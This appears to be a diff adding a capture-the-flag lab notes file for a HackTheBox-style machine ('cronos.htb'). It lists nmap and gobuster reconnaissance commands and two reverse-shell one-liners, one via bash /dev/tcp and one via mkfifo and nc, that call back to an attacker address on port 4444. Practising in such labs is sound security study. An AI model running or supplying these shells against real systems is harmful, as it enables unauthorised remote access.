@@ -1,0 +1,10 @@
+nmap -sTVC 10.129.96.97 -Pn > nmap.txt
+
+gobuster dir -u http://10.129.96.97 -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir -u http://cronos.htb -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobusterhost.txt
+
+bash -i >& /dev/tcp/10.10.14.26/4444 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4444 >/tmp/f
+
+
+
